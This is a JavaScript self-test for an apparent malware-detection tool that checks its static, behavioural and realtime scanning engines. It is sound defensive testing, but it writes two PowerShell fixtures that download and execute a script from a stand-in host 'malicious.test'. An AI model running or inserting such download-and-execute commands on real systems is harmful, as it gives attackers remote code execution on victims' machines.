import assert from "node:assert/strict";
import { promises as fs } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { StaticEngine } from "../src/static/static-engine.js";
import { IocStore } from "../src/threat-intel/ioc-store.js";
import { DecisionEngine } from "../src/decision/decision-engine.js";
import { BehaviorEngine } from "../src/behavior/behavior-engine.js";
import { CorrelationEngine } from "../src/correlation/correlation-engine.js";
import { replayJsonl } from "../src/behavior/event-collector.js";
import { RealtimeProtectionEngine } from "../src/realtime/realtime-engine.js";
import { defaultIocDir, defaultRulesFile } from "../src/core/paths.js";

const currentFile = fileURLToPath(import.meta.url);
const projectRoot = path.dirname(path.dirname(currentFile));
const tmpDir = path.join(projectRoot, ".tmp", "selftest");

async function run() {
  await fs.rm(tmpDir, { recursive: true, force: true });
  await fs.mkdir(tmpDir, { recursive: true });

  const suspiciousScript = path.join(tmpDir, "suspicious.ps1");
  await fs.writeFile(
    suspiciousScript,
    "IEX (New-Object Net.WebClient).DownloadString('http://malicious.test/payload.ps1')\n",
    "utf8"
  );

  const iocStore = await IocStore.load(defaultIocDir);
  const staticEngine = await StaticEngine.create({ iocStore, rulesFile: defaultRulesFile });
  const staticResult = await staticEngine.scanFile(suspiciousScript);
  const staticDetection = new DecisionEngine().decide({
    subject: suspiciousScript,
    signals: staticResult.signals
  });
  assert.ok(staticDetection.score >= 40, "static scan should reach monitor threshold");
  assert.ok(staticResult.signals.some((signal) => signal.category === "powershell_downloader"));

  const behavior = new BehaviorEngine({ iocStore });
  const correlation = new CorrelationEngine();
  const replaySignals = [];
  await replayJsonl(path.join(projectRoot, "examples", "events.jsonl"), async (event) => {
    const signals = behavior.ingest(event);
    const derived = correlation.addSignals(signals);
    replaySignals.push(...signals, ...derived);
  });
  const replayDetection = new DecisionEngine().decide({
    subject: "examples/events.jsonl",
    signals: replaySignals
  });

  assert.ok(replayDetection.score >= 100, "behavior replay should reach response threshold");
  assert.ok(replaySignals.some((signal) => signal.category === "process_injection"));
  assert.ok(replaySignals.some((signal) => signal.category === "known_c2_ip"));

  const realtimeDir = path.join(tmpDir, "watch");
  await fs.mkdir(realtimeDir, { recursive: true });
  const realtimeResults = [];
  const realtimeEngine = new RealtimeProtectionEngine({
    targets: [realtimeDir],
    debounceMs: 50,
    scanFile: async (file) => {
      const result = await staticEngine.scanFile(file);
      const detection = new DecisionEngine().decide({
        subject: file,
        signals: result.signals
      });
      return { ...result, detection, actions: [] };
    },
    onResult: async (result) => {
      realtimeResults.push(result);
    }
  });
  await realtimeEngine.start();
  await fs.writeFile(
    path.join(realtimeDir, "dropper.ps1"),
    "IEX (New-Object Net.WebClient).DownloadString('http://malicious.test/dropper.ps1')\n",
    "utf8"
  );
  await waitFor(() => realtimeResults.length > 0, 3000);
  await realtimeEngine.stop();
  assert.ok(realtimeResults[0].detection.score >= 40, "realtime watch should scan changed files");

  console.log("Self-test passed.");
}

async function waitFor(predicate, timeoutMs) {
  const started = Date.now();
  while (Date.now() - started < timeoutMs) {
    if (predicate()) return;
    await new Promise((resolve) => setTimeout(resolve, 50));
  }
  throw new Error("Timed out while waiting for condition");
}

run().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
